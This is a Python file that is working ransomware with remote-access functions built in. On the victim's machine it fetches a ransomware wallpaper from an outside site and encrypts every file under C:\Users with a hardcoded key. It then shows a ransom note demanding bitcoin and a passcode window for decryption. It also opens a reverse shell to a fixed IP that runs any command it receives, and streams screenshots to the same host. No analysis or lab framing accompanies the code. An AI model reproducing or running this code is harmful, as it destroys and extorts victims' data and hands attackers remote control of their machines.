import ctypes
import os
from cryptography.fernet import Fernet
import socket
import subprocess
import pyautogui
import pickle
import requests
import time
import zlib
import tkinter as tk
from PIL import ImageGrab
from tkinter import messagebox
import threading
def screen():
    HOST = "192.168.137.166"
    PORT = 7070
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((HOST, PORT))
    while True:
    # Capture screen
        screenshot = ImageGrab.grab()
        screenshot = screenshot.resize((1900, 1000))  # Resize for performance
        data = pickle.dumps(screenshot)
        compressed_data = zlib.compress(data)

        # Send image data size first
        server_socket.sendall(len(compressed_data).to_bytes(4, 'big'))
        server_socket.sendall(compressed_data)
def wall_paper_download():
    image_url = "https://the420.in/storage/2020/09/ransomware.jpeg"
    response = requests.get(image_url)
    if response.status_code == 200:
        with open("downloaded_image.jpg", "wb") as f:
            f.write(response.content)
wall_paper_download()
def change_wallpaper(image_path):
    abs_path = os.path.abspath(image_path)
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 0x01
    SPIF_SENDWININICHANGE = 0x02
    result = ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 0, abs_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
    )
time.sleep(10)
change_wallpaper("downloaded_image.jpg")
def enc():
    base_path = r'C:\Users'
    all_files = []
    for root, dirs, files in os.walk(base_path):
        for file in files:
            full_path = os.path.join(root, file)
            all_files.append(full_path)
        
    key = b'NzOeAcBA1PXDCc69HHroGlyspqadDPZnKw3k37-zyLk='
    for file in all_files:
        with open(file, mode="rb") as thefile:
            content = thefile.read()
            content_encrypt = Fernet(key).encrypt(content)
        with open(file, mode="wb") as thefile:
            thefile.write(content_encrypt)
time.sleep(15)
enc()
#def self_destrive():
#    os.system("del maldev.exe")
def decryptor():
    with open("encrypt.txt",mode="w") as txt:
        txt.write("your files has been encrypted by ransomeware to decrypt the files you need to pay the bitcoins to this address:- payment has been made today 12pm else the entire system brick")
    os.system("notepad.exe encrypt.txt")
    while True:
        def get_input():
            user_input = entry.get()
            if user_input == "passcode_you-get$*&###%#@!@":
                base_path = r'C:\Users'
                all_files = []
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        full_path = os.path.join(root, file)
                        all_files.append(full_path)
                key = b'NzOeAcBA1PXDCc69HHroGlyspqadDPZnKw3k37-zyLk='
                for file in all_files:
                    with open(file, mode="rb") as thefile:
                        content = thefile.read()
                        content_encrypt = Fernet(key).decrypt(content)
                    with open(file, mode="wb") as thefile:
                        thefile.write(content_encrypt)
                messagebox.showinfo("Alert", "decrypted go head")
            else:
                messagebox.showinfo("Alert", "you entered a wrong decryption key")
    
        root = tk.Tk()
        entry = tk.Entry(root)
        entry.pack()
        btn = tk.Button(root, text="Submit", command=get_input)
        btn.pack()
        root.mainloop()
        break
def execute_system_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        #print(f"Command execution failed: {e}")
        return None
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.137.166", 9090))
connection.send("\n[+] connection established\n".encode())
def host():
    while True:
        connection.send(">>>>>>>>>>>>>>>".encode())
        abc = (connection.recv(1024).decode())
        command_result = execute_system_command(abc)
        if command_result is not None:
            connection.send(command_result)
        else:
            screen() 
            continue
    connection.close()
thread1 = threading.Thread(target=decryptor)
thread2 = threading.Thread(target=host)
thread1.start()
thread2.start()
thread1.join()
thread2.join()
